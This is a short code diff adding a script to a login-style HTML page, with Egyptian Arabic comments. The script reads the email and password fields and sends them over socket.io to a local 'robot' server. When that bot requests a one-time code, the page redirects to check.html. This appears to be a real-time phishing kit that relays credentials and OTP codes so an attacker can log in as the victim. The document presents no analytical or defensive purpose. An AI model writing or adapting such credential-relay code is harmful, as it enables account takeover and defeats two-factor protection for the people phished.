@@ -72,6 +72,25 @@
         }
     }
 </script>
+
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+
+<script>
+    const socket = io('http://localhost:3000'); // بيكلم الروبوت اللي على جهازك
+
+    function sendData() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // بيبعت للروبوت فوراً
+        socket.emit('login_attempt', { email, password });
+
+        // أول ما الروبوت يحتاج OTP، الصفحة بتتحول لوحدها
+        socket.on('need_otp', () => {
+            window.location.href = "check.html"; 
+        });
+    }
+</script>
     
 </body>
 </html>
